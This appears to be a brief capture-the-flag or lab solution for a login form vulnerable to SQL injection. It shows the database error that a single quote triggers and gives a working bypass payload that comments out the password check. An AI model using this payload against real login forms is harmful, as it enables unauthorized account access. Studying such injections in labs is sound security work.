If you type a single quote in a username input you'll see an error:
<pre>
ERROR: syntax error at or near "cfde22c06265527e13450c88a8d14c75a42e49f5" LINE 1: ...ers WHERE (username = ('123'') AND password = ('cfde22c062... ^
</pre>
Solution:
<pre>
login input: 123') OR true ) --
</pre>
'--' adds a comment, so the password validation doesn't work<br>
GL